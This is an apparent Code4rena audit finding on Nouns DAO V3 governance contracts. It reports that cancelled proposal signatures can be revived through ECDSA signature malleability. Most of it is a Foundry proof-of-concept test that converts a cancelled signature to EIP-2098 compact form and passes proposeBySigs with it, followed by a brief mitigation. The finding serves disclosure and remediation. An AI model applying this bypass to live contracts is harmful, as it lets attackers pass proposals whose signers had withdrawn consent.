## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- grade-b
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-01

# [cancelSig will not completely cancel signatures due to malleability vulnerabilities](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198) 

# Lines of code

https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L270-L275
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L983


# Vulnerability details

## Impact

The current version of openzeppelin contracts has a high risk of vulnerability about signature malleability attack: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3610.
So if the signer only cancel one signature, the malicious proposer can still extend a fully valid signature through the previous signature to pass the proposal.

## Proof of Concept

```solidity
// CancelProposalBySigs.t.sol
contract TestSignatureMalleabilityAttack is ZeroState {
    function setUp() public virtual override {
        super.setUp();

        (signerWithVote, signerWithVotePK) = makeAddrAndKey('signerWithVote');

        vm.startPrank(minter);
        nounsToken.mint();
        nounsToken.transferFrom(minter, signerWithVote, 1);
        vm.roll(block.number + 1);
        vm.stopPrank();

        NounsDAOV3Proposals.ProposalTxs memory txs = makeTxs(makeAddr('target'), 0, '', '');
        uint256 expirationTimestamp = block.timestamp + 1234;
        NounsDAOStorageV3.ProposerSignature[] memory proposerSignatures = new NounsDAOStorageV3.ProposerSignature[](1);
        bytes memory signature = signProposal(proposer, signerWithVotePK, txs, 'description', expirationTimestamp, address(dao));
        vm.prank(signerWithVote);
        dao.cancelSig(signature);

        proposerSignatures[0] = NounsDAOStorageV3.ProposerSignature(
            signature,
            signerWithVote,
            expirationTimestamp
        );
        vm.expectRevert(abi.encodeWithSelector(NounsDAOV3Proposals.SignatureIsCancelled.selector));
        vm.prank(proposer);
        proposalId = dao.proposeBySigs(
            proposerSignatures,
            txs.targets,
            txs.values,
            txs.signatures,
            txs.calldatas,
            'description'
        );

        proposerSignatures[0] = NounsDAOStorageV3.ProposerSignature(
            to2098Format(signature),
            signerWithVote,
            expirationTimestamp
        );
        vm.prank(proposer);
        proposalId = dao.proposeBySigs(
            proposerSignatures,
            txs.targets,
            txs.values,
            txs.signatures,
            txs.calldatas,
            'description'
        );

        vm.roll(block.number + 1);

        assertEq(uint256(dao.state(proposalId)), uint256(NounsDAOStorageV3.ProposalState.Updatable));
    }

    // Copy from https://github.com/pcaversaccio/malleable-signatures/blob/1f618f556c0af48c44d27c7dbf1f97dc898ceda9/test/SignatureMalleability.t.sol#L78
    error InvalidSignatureLength();
    error InvalidSignatureSValue();
    function to2098Format(bytes memory signature) internal view returns (bytes memory) {
        if (signature.length != 65) revert InvalidSignatureLength();
        if (uint8(signature[32]) >> 7 == 1) revert InvalidSignatureSValue();
        bytes memory short = slice(signature, 0, 64);
        uint8 parityBit = uint8(short[32]) | ((uint8(signature[64]) % 27) << 7);
        short[32] = bytes1(parityBit);
        return short;
    }

    // Copy from https://github.com/GNSPS/solidity-bytes-utils/blob/6458fb2780a3092bc756e737f246be1de6d3d362/contracts/BytesLib.sol#L228
    function slice(
        bytes memory _bytes,
        uint256 _start,
        uint256 _length
    )
        internal
        pure
        returns (bytes memory)
    {
        require(_length + 31 >= _length, "slice_overflow");
        require(_bytes.length >= _start + _length, "slice_outOfBounds");

        bytes memory tempBytes;

        assembly {
            switch iszero(_length)
            case 0 {
                // Get a location of some free memory and store it in tempBytes as
                // Solidity does for memory variables.
                tempBytes := mload(0x40)

                // The first word of the slice result is potentially a partial
                // word read from the original array. To read it, we calculate
                // the length of that partial word and start copying that many
                // bytes into the array. The first word we copy will start with
                // data we don't care about, but the last `lengthmod` bytes will
                // land at the beginning of the contents of the new array. When
                // we're done copying, we overwrite the full first word with
                // the actual length of the slice.
                let lengthmod := and(_length, 31)

                // The multiplication in the next line is necessary
                // because when slicing multiples of 32 bytes (lengthmod == 0)
                // the following copy loop was copying the origin's length
                // and then ending prematurely not copying everything it should.
                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))
                let end := add(mc, _length)

                for {
                    // The multiplication in the next line has the same exact purpose
                    // as the one above.
                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)
                } lt(mc, end) {
                    mc := add(mc, 0x20)
                    cc := add(cc, 0x20)
                } {
                    mstore(mc, mload(cc))
                }

                mstore(tempBytes, _length)

                //update free-memory pointer
                //allocating the array padded to 32 bytes like the compiler does now
                mstore(0x40, and(add(mc, 31), not(31)))
            }
            //if we want a zero-length slice let's just return a zero-length array
            default {
                tempBytes := mload(0x40)
                //zero out the 32 bytes slice we are about to return
                //we need to do it because Solidity does not garbage collect
                mstore(tempBytes, 0)

                mstore(0x40, add(tempBytes, 0x20))
            }
        }

        return tempBytes;
    }

    function testAttack() public {}
}
```

```shell
forge test --match-test testAttack -vvvv --ffi
```

## Tools Used

Foundry

## Recommended Mitigation Steps

Update openzeppelin contracts to the new version


## Assessed type

Library